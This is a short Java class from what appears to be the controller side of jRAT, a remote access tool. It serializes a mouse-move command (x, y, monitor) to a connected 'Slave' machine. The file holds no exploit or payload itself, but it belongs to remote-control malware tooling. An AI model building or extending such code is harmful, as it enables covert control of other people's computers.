package pro.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.client.Slave;

public class Packet91MouseMove extends AbstractOutgoingPacket {

	private int x;
	private int y;
	private int monitor;

	public Packet91MouseMove(int x, int y, int monitor) {
		this.x = x;
		this.y = y;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(x);
		dos.writeInt(y);
		dos.writeInt(monitor);
	}

	@Override
	public byte getPacketId() {
		return 91;
	}

}
